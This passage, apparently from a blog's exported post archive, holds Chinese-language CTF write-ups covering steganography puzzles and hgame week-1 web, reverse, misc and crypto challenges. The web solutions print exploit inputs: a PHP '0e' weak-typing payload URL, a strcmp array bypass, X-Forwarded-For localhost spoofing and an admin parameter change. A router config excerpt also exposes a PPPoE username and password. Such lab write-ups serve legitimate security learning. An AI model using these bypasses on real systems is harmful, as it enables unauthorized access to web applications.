w:rsidR=&quot;002B3D8D&quot;&gt;-&lt;w:r&gt;&lt;w:t&gt;Flag&lt;/w:t&gt;&lt;/w:r&gt;-&lt;w:r&gt;&lt;w:t&gt;在这里呦！&lt;/w:t&gt;&lt;/w:r&gt;&lt;/w:p&gt;-&lt;w:p w:rsidRDefault=&quot;002B3D8D&quot; w:rsidR=&quot;002B3D8D&quot; w:rsidRPr=&quot;002B3D8D&quot;&gt;-&lt;w:pPr&gt;-&lt;w:rPr&gt;&lt;w:rFonts w:hint=&quot;eastAsia&quot;/&gt;&lt;w:vanish/&gt;&lt;/w:rPr&gt;&lt;/w:pPr&gt;-&lt;w:r w:rsidRPr=&quot;002B3D8D&quot;&gt;-&lt;w:rPr&gt;&lt;w:vanish/&gt;&lt;/w:rPr&gt;&lt;w:t&gt;flag&#123;F1@g&#125;&lt;/w:t&gt;&lt;/w:r&gt;&lt;w:bookmarkStart w:name=&quot;_GoBack&quot; w:id=&quot;0&quot;/&gt;&lt;w:bookmarkEnd w:id=&quot;0&quot;/&gt;&lt;/w:p&gt; 又一张图片，还单纯吗下载图片，用binwalk看一下，发现有多个文件，用foremost命令分离出来，发现flag就在分离出来的图片上； 猜有点儿脑洞，题目给了一张只有一半头像的图片，让我们猜这个人的名字，这里我直接用百度图片的搜索功能找出这个人就是刘亦菲，flag get； 宽带信息泄露下载得到一个bin文件，应该是一个配置文件，我们用路由器配置查看器查看bin文件工具下载地址：http://www.ouyaoxiazai.com/soft/llrj/55/18061.html#dizhi打开配置文件可以直接搜索一下username或者password，即可得到flag。1234567891011&lt;WANPPPConnection instance=1 &gt; &lt;Enable val=1 /&gt; &lt;DefaultGateway val=10.177.144.1 /&gt; &lt;Name val=pppoe_eth1_d /&gt; &lt;Uptime val=671521 /&gt; &lt;Username val=053700357621 /&gt; &lt;Password val=210265 /&gt; &lt;X_TP_IfName val=ppp0 /&gt; &lt;X_TP_L2IfName val=eth1 /&gt; &lt;X_TP_ConnectionId val=1 /&gt; &lt;ExternalIPAddress val=10.177.150.82 /&gt; 隐写2得到一张图片，用binwalk分析一下，有一个压缩包，分离出来后图片上提示压缩包密码3位数，所以直接暴力破解，密码是871，解压后是一张3.jpg的图片，用winhex打开，在末尾看到一串字符1f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE=&#125; 直接提交发现不对，然后对flag里面的字符串进行base64解码，得到123\x79 \x30 \x75 \x20 \x41 \x72 \x65 \x20 \x61 \x20 \x68 \x40 \x63 \x6b \x65 \x72 \x21 接着我们将其转换成ASCII，在线转换地址：http://www.ab126.com/goju/1711.html,可以得到flag； 123\y \0 \u \ \A \r \e \ \a \ \h \@ \c \k \e \r \! 这里提交的时候要把前面的f1@g改成flag，我也是试了几次才对的。 多种方法解决下载得到一个exe文件，无法运行，妖魔化winhex打开发现是一串base64编码，这里用base64转图片地址：http://tool.chinaz.com/tools/imgtobase可以得到一张二维码，直接扫一扫可以得到flag； linux中国菜刀这么多数据包隐写3下载得到一张图片，发现宽和高不太协调，想到png像素隐藏，参考余老师的一篇文章png像素隐写用winhex改一下像素值就可以得到flag。 细心地大象先用binwalk分离出加密压缩包，查看图片属性发现一串字符串在备注1TVNEUzQ1NkFTRDEyM3p6 试了一下密码不对，又base64解码了一下，发现可以解开压缩包，得到另一张图片，这张图片就是用了之前的png像素隐藏，所以修改一下像素就可以得到flag。 ###]]></content>
      <tags>
        <tag>-ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hgame（week_1）-----未完待续]]></title>
    <url>%2F2018%2F02%2F06%2Fhgame%EF%BC%88weekek-1%EF%BC%89-%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD%2F</url>
    <content type="text"><![CDATA[又是一个划水的比赛，又控制不住自己的双手，还是去水了几题，写点东西记录一下吧！！！ week1webAre you from Europe? 打开题目地址，是一个抽奖页面，f12看一下源码 发现有一个getcard的函数，并且SSR的概率极低（0.0000001），我们可以通过重写函数把SSR的概率改为1，通过控制台写入，然后进行抽奖，得到flag：hgame{Th3_Ch0seN_0nE!} special number题目提示PHP弱类型 这里参考了http://www.freebuf.com/articles/web/129607.html这篇文章 然后分析源码 我们还需要绕过正则表达式， 构造payload:http://118.25.18.223:10001/?key=0e000000000000000000000来获取flag（0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换） 提交后即可得到flag：hgame{pHp_w34k_typing_s000_e4sy}。 can u find me? 打开题目地址提示only robot know where is the flag ，我们可以想到robots.txt文件 访问robots.txt可以看到一个/f1aaaaaaaag.php的页面 访问该页面提示only admin can get flag 通过burp抓包改一下user=admin即可得到flag。 tell me what you want根据题目提示提交?want=flag,提示“request method is error.I think POST is better” 改用POST提交，提示“only localhost can get flag” 需要构造X-Forwarded-For: 127.0.0.1来实现本地访问 通过burp修改请求头可以得到flag：hgame{For9e_hTTp_iS_N0T_HArd} 我们不一样代码如下： 12345678if(isset($_POST[&apos;str1&apos;])&amp;&amp;isset($_POST[&apos;str2&apos;]))&#123; if ($_POST[&apos;str1&apos;]!=$_POST[&apos;str2&apos;]&amp;&amp;strcmp($_POST[&apos;str1&apos;],$_POST[&apos;str2&apos;])==0) &#123; echo &quot;flag is:&quot;.$flag; exit(); &#125; else&#123; echo &quot;Something wrong..&quot;; &#125;&#125; 题目提示PHP弱类型，参考http://www.freebuf.com/articles/web/129607.html， 我们的payload：str1=123 &amp; str2[]= POST提交后可得到flag:flag is:hgame{g3t_f14g_is_so0000_ez} rere0 下载得到一个re0.exe,用OD打开，查找所有参考文本字符串，即可得到flag。 baby_crack没做出来QAQ nop_pop没做出来+1QAQ sc2_player同样没做出来QWQ pwn对萌新来说太难了，准备花时间好好学学pwn，以pwn签到题为目标。 misc白菜1 拿到flag.png,先到binwalk跑一下，发现有一个zlib文件，emmmm然后卡住了，感觉这条路走不通 又试了一下LSB隐写，发现RGB的0通道里面与一个flag.txt,提取出相应的数据，用binwalk分离得到flag.txt,打开即可得到flag。 白菜2 拿到一张misc.jpg,binwalk看一下，发现有一个zip压缩包，分离出来解压缩即可得到flag。 pacp1 典型的流量分析，用wireshark打开，筛选HTTP流量，发现第557个包有一个访问flag.php的请求，第559个包回复相关信息，查看详细字段即可得到flag。 cryptoeasy Caesar 这题卡了很久，对密文进行凯撒解密发现有一个hgame开头的结果，应该就是我们要的flag，但是提交不上去，后面百度了一下这句话，发现语义为“The quick brown fox jumps over a lazy dog”，结合我们解出来的“The_qu8ck_br7wn_1x_jUmps_ovEr_a_La9y_dOg”，一下子没了思路，后面才知道是数字也要类似凯撒密码进行移位，n=3，即可得到flag。 Polybius 又是一个没见过的英语单词，放上去百度一下，发现是“波利比奥斯方阵密码”，非常高兴。但是方阵密码是用1-5的数字表示字母密文的。猜想一下，应该是有变形，查找一下，果然是这样。变形的密码用A、D、F、G、X五个字母表示，跟题目给出的内容吻合，完美！ 两位字母表示一个密文，如AF=a，字母j和i视为同一个字母。得出hgame{fritz_nebel_invented_it} Hill 老办法，百度一下，发现的希尔密码，秘钥是9 17 6 5，后面的字母是密文。这里有一个在线解密网站：http://www.practicalcryptography.com/ciphers/hill-cipher/跑一下得到flag:hgame{overthehillx}。 confusion 摩斯密码：MRLTK6KXNVZXQWBSNA2FSU2GGBSW45BSLAZFU6SVJBNDAZSRHU6Q==== Base32:dW5yWmsxX2h4YSF0ent2X2ZzUHZ0fQ== Base64 : unrZk1_hxa!tz{v_fsPvt} 栅栏: n=2 unrZk1_hxa!tz{v_fsPvt} 凯撒: hgame{Mix_1s_fuCking!} baby step没解出来QAQ]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
</search>
